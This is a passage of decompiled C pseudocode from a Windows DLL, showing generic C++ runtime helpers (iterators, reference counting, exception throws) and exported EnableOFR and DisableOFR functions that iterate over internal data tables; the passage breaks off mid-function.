LONG __stdcall sub_1000A4C9(int a1)
{
  return sub_1000CE59((int *)(a1 + 8));
}

//----- (1000A4F0) --------------------------------------------------------
void __usercall sub_1000A4F0(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[3]; // [esp+8h] [ebp-18h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_1000A59A(v4, v5[0]);
  }
  v6 = -1;
  sub_1000AE88(v5);
}
// 1000A52B: variable 'v4' is possibly undefined

//----- (1000A55A) --------------------------------------------------------
int __usercall sub_1000A55A@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000A59A) --------------------------------------------------------
int __usercall sub_1000A59A@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000A5CB) --------------------------------------------------------
_DWORD *__thiscall sub_1000A5CB(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100934F0;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10093530;
  a2[3] = a3;
  return result;
}
// 100934F0: using guessed type int (__thiscall *off_100934F0)(void *Block, char);
// 10093530: using guessed type int (__thiscall *off_10093530)(void *Block, char);

//----- (1000A609) --------------------------------------------------------
void *__thiscall sub_1000A609(_DWORD *this)
{
  void *result; // eax

  result = &loc_100783A2;
  *this = &off_10093530;
  *this = &off_100934F0;
  return result;
}
// 100934F0: using guessed type int (__thiscall *off_100934F0)(void *Block, char);
// 10093530: using guessed type int (__thiscall *off_10093530)(void *Block, char);

//----- (1000A633) --------------------------------------------------------
BOOL __thiscall sub_1000A633(_DWORD *this)
{
  return this[3] == 0;
}

//----- (1000A63C) --------------------------------------------------------
BOOL __thiscall sub_1000A63C(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000A645) --------------------------------------------------------
int __thiscall sub_1000A645(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1000A669) --------------------------------------------------------
int __thiscall sub_1000A669(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[3] = result;
  return result;
}

//----- (1000A696) --------------------------------------------------------
int __thiscall sub_1000A696(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 20);
  this[2] = result;
  return result;
}

//----- (1000A6C3) --------------------------------------------------------
void __thiscall sub_1000A6C3(_DWORD *this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *v7; // ebx
  int pExceptionObject; // [esp+Ch] [ebp-4h] BYREF

  v2 = this[3];
  if ( !v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 16);
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 16) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 20) = this[2];
  v5 = this[1];
  if ( *(_DWORD *)(v5 + 4) == this[3] )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = this[1];
  if ( *(_DWORD *)(v6 + 8) == this[3] )
    *(_DWORD *)(v6 + 8) = this[2];
  v7 = (void *)this[3];
  if ( v7 )
  {
    sub_1000A4A5(this[3]);
    j__free(v7);
  }
  this[3] = v3;
  --*(_DWORD *)(this[1] + 12);
}

//----- (1000A742) --------------------------------------------------------
_DWORD *__thiscall sub_1000A742(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[4]; // [esp-18h] [ebp-30h] BYREF
  int v7; // [esp-8h] [ebp-20h]
  int v8; // [esp-4h] [ebp-1Ch]
  int *v9; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v11; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x18u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000AA12(v6, a2);
    LOBYTE(v11) = 0;
    result = sub_1000AA81(Block, v6[0], v6[1], v6[2], v6[3], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 16) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 20) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000A7CF) --------------------------------------------------------
_DWORD *__thiscall sub_1000A7CF(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10093510;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10093550;
  a2[3] = a3;
  return result;
}
// 10093510: using guessed type int (__thiscall *off_10093510)(void *Block, char);
// 10093550: using guessed type int (__thiscall *off_10093550)(void *Block, char);

//----- (1000A80D) --------------------------------------------------------
void *__thiscall sub_1000A80D(_DWORD *this)
{
  void *result; // eax

  result = &loc_1007837E;
  *this = &off_10093550;
  *this = &off_10093510;
  return result;
}
// 10093510: using guessed type int (__thiscall *off_10093510)(void *Block, char);
// 10093550: using guessed type int (__thiscall *off_10093550)(void *Block, char);

//----- (1000A837) --------------------------------------------------------
BOOL __thiscall sub_1000A837(_DWORD *this)
{
  return this[3] == 0;
}

//----- (1000A840) --------------------------------------------------------
BOOL __thiscall sub_1000A840(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000A849) --------------------------------------------------------
int __thiscall sub_1000A849(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1000A86D) --------------------------------------------------------
int __thiscall sub_1000A86D(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[3] = result;
  return result;
}

//----- (1000A89A) --------------------------------------------------------
int __thiscall sub_1000A89A(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 20);
  this[2] = result;
  return result;
}

//----- (1000A8C7) --------------------------------------------------------
void __thiscall sub_1000A8C7(_DWORD *this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *v7; // ebx
  int pExceptionObject; // [esp+Ch] [ebp-4h] BYREF

  v2 = this[3];
  if ( !v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 16);
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 16) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 20) = this[2];
  v5 = this[1];
  if ( *(_DWORD *)(v5 + 4) == this[3] )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = this[1];
  if ( *(_DWORD *)(v6 + 8) == this[3] )
    *(_DWORD *)(v6 + 8) = this[2];
  v7 = (void *)this[3];
  if ( v7 )
  {
    sub_1000A4A5(this[3]);
    j__free(v7);
  }
  this[3] = v3;
  --*(_DWORD *)(this[1] + 12);
}

//----- (1000A946) --------------------------------------------------------
_DWORD *__thiscall sub_1000A946(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[4]; // [esp-18h] [ebp-30h] BYREF
  int v7; // [esp-8h] [ebp-20h]
  int v8; // [esp-4h] [ebp-1Ch]
  int *v9; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v11; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x18u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000AA12(v6, a2);
    LOBYTE(v11) = 0;
    result = sub_1000AA81(Block, v6[0], v6[1], v6[2], v6[3], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 16) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 20) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000A9D3) --------------------------------------------------------
void __thiscall sub_1000A9D3(void *this)
{
  sub_1000AC0D(this);
}

//----- (1000A9F6) --------------------------------------------------------
_DWORD *__thiscall sub_1000A9F6(_DWORD *Block, char a2)
{
  sub_1000A609(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AA12) --------------------------------------------------------
_DWORD *__stdcall sub_1000AA12(_DWORD *a1, _DWORD *a2)
{
  *a1 = *a2;
  a1[1] = a2[1];
  sub_1000CE26(a1 + 2, (int)(a2 + 2));
  return a1;
}

//----- (1000AA4F) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA4F(_DWORD *Block, char a2)
{
  sub_1000A80D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AA81) --------------------------------------------------------
_DWORD *__stdcall sub_1000AA81(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  sub_1000AA12(a1, &a2);
  a1[4] = a6;
  a1[5] = a7;
  sub_1000A4C9((int)&a2);
  return a1;
}

//----- (1000AAD3) --------------------------------------------------------
_DWORD *__userpurge sub_1000AAD3@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000AB17) --------------------------------------------------------
void __thiscall sub_1000AB17(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000AF44((int)this);
}

//----- (1000AB50) --------------------------------------------------------
_DWORD *__usercall sub_1000AB50@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (1000AB64) --------------------------------------------------------
_DWORD *__userpurge sub_1000AB64@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000ABA8) --------------------------------------------------------
_DWORD *__usercall sub_1000ABA8@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_100097E7((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1000ABCD) --------------------------------------------------------
_DWORD *__usercall sub_1000ABCD@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000AC0D) --------------------------------------------------------
void __thiscall sub_1000AC0D(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000AF7E((int)this);
}

//----- (1000AC5A) --------------------------------------------------------
_DWORD *__userpurge sub_1000AC5A@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000AC9E) --------------------------------------------------------
void __thiscall sub_1000AC9E(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000AFB8((int)this);
}

//----- (1000ACD7) --------------------------------------------------------
_DWORD *__usercall sub_1000ACD7@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_1000AFB8((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1000AD10) --------------------------------------------------------
_DWORD *__usercall sub_1000AD10@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000AD50) --------------------------------------------------------
void __thiscall sub_1000AD50(void **this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000B03C(this);
}

//----- (1000ADAD) --------------------------------------------------------
_DWORD *__userpurge sub_1000ADAD@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000ADF1) --------------------------------------------------------
void __thiscall sub_1000ADF1(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000B072((int)this);
}

//----- (1000AE44) --------------------------------------------------------
_DWORD *__userpurge sub_1000AE44@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000AE88) --------------------------------------------------------
void __thiscall sub_1000AE88(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000B0AC((int)this);
}

//----- (1000AEC7) --------------------------------------------------------
char *__usercall sub_1000AEC7@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 0xCu, *((_DWORD *)a1 - 1), sub_1000AEE5);
  j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (1000AEE5) --------------------------------------------------------
void __thiscall sub_1000AEE5(void *this)
{
  sub_1000AB17(this);
}

//----- (1000AF08) --------------------------------------------------------
char *__usercall sub_1000AF08@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 0xCu, *((_DWORD *)a1 - 1), sub_1000A9D3);
  j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (1000AF26) --------------------------------------------------------
char *__usercall sub_1000AF26@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_1000AC0D);
  j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (1000AF44) --------------------------------------------------------
void __usercall sub_1000AF44(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000AF7E) --------------------------------------------------------
void __usercall sub_1000AF7E(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000AFB8) --------------------------------------------------------
void __usercall sub_1000AFB8(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000AFE0) --------------------------------------------------------
_DWORD *__usercall sub_1000AFE0@<eax>(int a1@<ecx>, int a2@<edi>)
{
  _DWORD *result; // eax

  result = &loc_1007831E;
  if ( *(_DWORD *)a1 != a2 )
  {
    sub_1000B03C((void **)a1);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    *(_DWORD *)(a1 + 4) = result;
    *(_DWORD *)a1 = a2;
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000B03C) --------------------------------------------------------
void __usercall sub_1000B03C(void **a1@<esi>)
{
  if ( !InterlockedDecrement((volatile LONG *)a1[1]) )
  {
    if ( a1[1] )
      j__free(a1[1]);
    j__free(*a1);
  }
}

//----- (1000B072) --------------------------------------------------------
void __usercall sub_1000B072(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000B0AC) --------------------------------------------------------
void __usercall sub_1000B0AC(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000B106) --------------------------------------------------------
int __cdecl EnableOFR(
        int a1,
        int a2,
        int a3,
        char a4,
        int a5,
        int a6,
        char a7,
        int a8,
        int a9,
        char a10,
        int a11,
        int a12,
        int a13,
        int a14,
        char a15,
        int a16,
        int a17,
        char a18,
        int a19,
        int a20,
        int a21,
        void *a22,
        char a23,
        int a24,
        char a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30)
{
  return sub_1000B10A(
           a1,
           a2,
           a3,
           a4,
           a5,
           a6,
           a7,
           a8,
           a9,
           a10,
           a11,
           a12,
           a13,
           a14,
           a15,
           a16,
           a17,
           a18,
           a19,
           a20,
           a21,
           a22,
           a23,
           a24,
           a25,
           a26,
           a27,
           a28,
           a29,
           a30);
}
// 1000B10A: using guessed type _DWORD __cdecl sub_1000B10A(_DWORD, _DWORD, _DWORD, char, _DWORD, _DWORD, char, _DWORD, _DWORD, char, _DWORD, _DWORD, _DWORD, _DWORD, char, _DWORD, _DWORD, char, _DWORD, _DWORD, _DWORD, void *Block, char, _DWORD, char, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (1000B10A) --------------------------------------------------------
int __cdecl sub_1000B10A(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        void *Block,
        int a23,
        int a24,
        int a25,
        unsigned int j,
        unsigned int i,
        int a28,
        int a29,
        _DWORD *a30)
{
  int v30; // eax
  unsigned int v32; // esi
  _DWORD *v33; // eax
  _DWORD *v34; // eax
  _DWORD *v35; // eax
  unsigned int v36; // esi
  _DWORD *v37; // eax
  _DWORD *v38; // eax
  _DWORD *v39; // eax
  _DWORD *v40; // eax
  int v41; // [esp+0h] [ebp-98h] BYREF
  char v42[124]; // [esp+Ch] [ebp-8Ch] BYREF
  int *v43; // [esp+88h] [ebp-10h]
  int v44; // [esp+94h] [ebp-4h]
  int vars0; // [esp+98h] [ebp+0h] BYREF

  v43 = &v41;
  sub_10010428((int)&a15);
  v44 = 0;
  sub_1000EFCA();
  LOBYTE(v44) = 1;
  v30 = sub_10015E65();
  if ( (v30 < 6 || v30 > 9) && v30 != 13 )
    goto LABEL_4;
  sub_1000EE6C(&a18);
  LOBYTE(v44) = 2;
  sub_10010CE9(&a10, (int)&a18);
  LOBYTE(v44) = 3;
  for ( i = 0; ; ++i )
  {
    v32 = i;
    if ( i >= 0x5F )
      break;
    v33 = operator new(0x10u);
    Block = v33;
    LOBYTE(v44) = 4;
    if ( v33 )
      v34 = sub_1001029F(v33, (int)&unk_100BF280 + 8 * v32, (int)&a18);
    else
      v34 = 0;
    LOBYTE(v44) = 3;
    v35 = sub_1000168A(&a23, (int)v34);
    LOBYTE(v44) = 5;
    sub_10001594(&a10, (int)v35);
    LOBYTE(v44) = 3;
    sub_100016CE(&a23);
  }
  for ( j = 0; ; ++j )
  {
    v36 = j;
    if ( j >= 0xE )
      break;
    v37 = operator new(0x10u);
    Block = v37;
    LOBYTE(v44) = 6;
    if ( v37 )
      v38 = sub_1001029F(v37, (int)&unk_100BF210 + 8 * v36, (int)&a18);
    else
      v38 = 0;
    LOBYTE(v44) = 3;
    v39 = sub_1000168A(&a23, (int)v38);
    LOBYTE(v44) = 7;
    sub_10001594(&a10, (int)v39);
    LOBYTE(v44) = 3;
    sub_100016CE(&a23);
  }
  if ( sub_10010D5F(&a10) != -1 )
  {
    LOBYTE(v44) = 2;
    sub_10010D3B(&a10);
    LOBYTE(v44) = 1;
    sub_1000EE98(&a18);
LABEL_4:
    v44 = -1;
    sub_10010466(&a15);
    return 1;
  }
  sub_10001520(&a25);
  LOBYTE(v44) = 8;
  sub_1000F0BC();
  sub_100140E1(dword_100BF690, (int)&a7, 1, 1u, 0);
  LOBYTE(v44) = 9;
  v40 = (_DWORD *)sub_10016983(0, (int)&vars0, 0);
  LOBYTE(v44) = 10;
  sub_10012ECB((int)v42, (int)&unk_100BF680, (int)&unk_100BF688, (int)&a7, (int)&unk_100BF678, v40, a30, 0);
  LOBYTE(v44) = 12;
  sub_10016B53(&vars0);
  sub_10013290((int)v42, &a4);
  LOBYTE(v44) = 12;
  sub_1000EA34(&a4);
  LOBYTE(v44) = 9;
  sub_1001314D((int)v42);
  LOBYTE(v44) = 8;
  sub_100141CF(&a7);
  LOBYTE(v44) = 3;
  sub_10001553(&a25);
  LOBYTE(v44) = 2;
  sub_10010D3B(&a10);
  LOBYTE(v44) = 1;
  sub_1000EE98(&a18);
  v44 = -1;
  sub_10010466(&a15);
  return 1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BF690: using guessed type _DWORD dword_100BF690[2];

//----- (1000B359) --------------------------------------------------------
int DisableOFR()
{
  _DWORD v1[3]; // [esp+4h] [ebp-18h] BYREF
  int v2; // [esp+18h] [ebp-4h]

  sub_10010428((int)v1);
  v2 = 0;
  sub_1000EFCA();
  sub_1000B39D();
  sub_1000B811();
  v2 = -1;
  sub_10010466(v1);
  return 1;
}
// 1000B359: using guessed type _DWORD var_18[3];

//----- (1000B39D) --------------------------------------------------------
LONG sub_1000B39D()
{
  int v0; // eax
  int v2[3]; // [esp+0h] [ebp-18h] BYREF
  int v3; // [esp+14h] [ebp-4h]

  v0 = sub_100140E1(dword_100BF690, (int)v2, 1, 1u, 0);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v0 + 16))(v0);
  v3 = -1;
  return sub_100141CF(v2);
}
// 100BF690: using guessed type _DWORD dword_100BF690[2];
// 1000B39D: using guessed type int var_18[3];

//----- (1000B3E1) --------------------------------------------------------
int __stdcall sub_1000B3E1(_DWORD *a1)
{
  char *v1; // ebx
  int v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  char *v6; // ebx
  int v7; // edi
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  int v13; // eax
  _DWORD *v14; // eax
  char v16; // [esp+10h] [ebp-A8h]
  void *Block; // [esp+14h] [ebp-A4h]
  _DWORD v18[2]; // [esp+18h] [ebp-A0h] BYREF
  _DWORD v19[4]; // [esp+20h] [ebp-98h] BYREF
  int v20[3]; // [esp+30h] [ebp-88h] BYREF
  _DWORD v21[5]; // [esp+3Ch] [ebp-7Ch] BYREF
  int v22[3]; // [esp+50h] [ebp-68h] BYREF
  int v23[4]; // [esp+5Ch] [ebp-5Ch] BYREF
  int v24[5]; // [esp+6Ch] [ebp-4Ch] BYREF
  int v25[11]; // [esp+80h] [ebp-38h] BYREF
  int v26; // [esp+B4h] [ebp-4h]

  v16 = 0;
  sub_1000EE6C(v19);
  v26 = 0;
  sub_10010CE9(v21, (int)v19);
  LOBYTE(v26) = 1;
  v1 = (char *)&unk_100BF280;
  v2 = 95;
  do
  {
    v3 = operator new(0x10u);
    LOBYTE(v26) = 2;
    if ( v3 )
      v4 = sub_1001029F(v3, (int)v1, (int)v19);
    else
      v4 = 0;
    LOBYTE(v26) = 1;
    v5 = sub_1000168A(v18, (int)v4);
    LOBYTE(v26) = 3;
    sub_10001594(v21, (int)v5);
    LOBYTE(v26) = 1;
    sub_100016CE(v18);
    v1 += 8;
    --v2;
  }
  while ( v2 );
  v6 = (char *)&unk_100BF210;
  v7 = 14;
  do
  {
    v8 = operator new(0x10u);
    LOBYTE(v26) = 4;
    if ( v8 )
      v9 = sub_1001029F(v8, (int)v6, (int)v19);
    else
      v9 = 0;
    LOBYTE(v26) = 1;
    v10 = sub_1000168A(v18, (int)v9);
    LOBYTE(v26) = 5;
    sub_10001594(v21, (int)v10);
    LOBYTE(v26) = 1;
    sub_100016CE(v18);
    v6 += 8;
    --v7;
  }
